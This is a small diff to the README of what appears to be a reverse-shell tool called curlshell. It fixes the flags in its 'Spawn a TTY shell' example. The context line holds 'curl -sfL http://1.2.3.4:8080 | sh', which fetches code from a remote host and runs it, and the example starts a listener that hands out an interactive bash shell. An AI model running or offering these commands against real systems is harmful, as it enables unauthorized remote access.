@@ -50,7 +50,7 @@ curl -sfL http://1.2.3.4:8080 | sh
 Spawn a TTY shell
 ```sh
 stty intr undef ;
-./curlshell.py --shell 'script -q /dev/null /bin/bash' --listen-port 8080 ; stty intr ^C
+./curlshell.py --shell 'script -qc /bin/bash /dev/null' --listen-port 8080 ; stty intr ^C
 ```
 
 # How it works
